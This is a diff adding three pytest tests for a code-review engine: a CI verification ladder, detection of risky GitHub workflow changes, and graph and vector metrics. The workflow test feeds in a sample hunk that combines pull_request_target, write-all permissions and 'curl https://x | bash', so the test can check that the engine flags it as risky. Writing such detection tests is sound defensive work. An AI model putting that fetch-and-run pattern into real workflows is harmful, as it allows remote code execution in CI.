@@ -201,3 +201,84 @@ def test_v5_trace_is_hash_only() -> None:
     assert isinstance(trace, dict)
     assert "query_hash" in trace
     assert question not in str(trace)
+
+
+def test_v5_verification_ladder_tracks_pass_fail_pending_and_not_run() -> None:
+    module = _load_v5_module()
+    core = module.TopoCoreTCXv5AdvanceCASGit()
+    req = EngineRequest(
+        task_type="review",
+        query=EngineQuery(text="review ci ladder", signature=[1]),
+        candidates=[EngineCandidate(chunk_id="c1", score_local=0.9, file_path="repobrain/review.py")],
+        limits={"max_sources": 1},
+        policy={
+            "verification_context": {
+                "checks": [
+                    {"name": "pytest -q", "status": "success"},
+                    {"name": "ruff check .", "status": "failure"},
+                    {"name": "security scan", "status": "in_progress"},
+                ],
+                "required_checks": ["security scan", "integration-tests"],
+            }
+        },
+    )
+    decision = core.decide(req)
+    stats = decision.compression_stats
+    ladder = stats.get("verification_ladder", [])
+    assert isinstance(ladder, list)
+    assert any(item.get("check") == "pytest -q" and item.get("state") == "PASS" for item in ladder)
+    assert any(item.get("check") == "ruff check ." and item.get("state") == "FAIL" for item in ladder)
+    assert any(item.get("check") == "security scan" and item.get("state") == "PENDING" for item in ladder)
+    assert any(item.get("check") == "integration-tests" and item.get("state") == "NOT_RUN" for item in ladder)
+    assert stats.get("verification_fail_count", 0) >= 1
+    assert stats.get("verification_pending_count", 0) >= 1
+    assert stats.get("verification_not_run_count", 0) >= 1
+    assert stats.get("verification_strict_pass") is False
+
+
+def test_v5_morse_workflow_risky_signal_produces_medium_or_high_risk() -> None:
+    module = _load_v5_module()
+    core = module.TopoCoreTCXv5AdvanceCASGit()
+    req = EngineRequest(
+        task_type="ask",
+        query=EngineQuery(text="evaluate workflow safety", signature=[1]),
+        candidates=[EngineCandidate(chunk_id="c1", score_local=0.6, file_path=".github/workflows/ci.yml")],
+        limits={"max_sources": 1},
+        policy={
+            "github_context": {
+                "is_pr": True,
+                "changed_files": [".github/workflows/ci.yml"],
+                "diff_hunks": [
+                    "on: pull_request_target\npermissions: write-all\nrun: curl https://x | bash"
+                ],
+            }
+        },
+    )
+    decision = core.decide(req)
+    stats = decision.compression_stats
+    assert stats.get("morse_workflow_risky") is True
+    assert float(stats.get("morse_confidence", 0.0)) > 0.0
+    assert str(stats.get("morse_risk", "low")) in {"medium", "high"}
+    signals = stats.get("morse_signals", [])
+    assert isinstance(signals, list)
+    assert "workflow_risky_pattern" in signals or "workflow_files_changed" in signals
+
+
+def test_v5_topology_kernel_handles_graph_vector_and_paths() -> None:
+    module = _load_v5_module()
+    core = module.TopoCoreTCXv5AdvanceCASGit()
+    result = core.run_topological_calculation(
+        {
+            "series": [1, 2, 3, 5, 8, 13],
+            "vectors": [[0.0, 0.0], [1.0, 1.5], [2.0, 2.5]],
+            "graph_edges": [["A", "B"], ["B", "C"], ["X", "Y"]],
+            "path_lengths": [2, 3, 5, 8],
+        }
+    )
+    metrics = result.get("metrics", {})
+    assert isinstance(metrics, dict)
+    assert "graph_nodes" in metrics
+    assert "graph_density" in metrics
+    assert "vector_count" in metrics
+    assert "path_mean" in metrics
+    assert result.get("mode") in {"analytics", "analytics_graph", "analytics_graph_vector"}
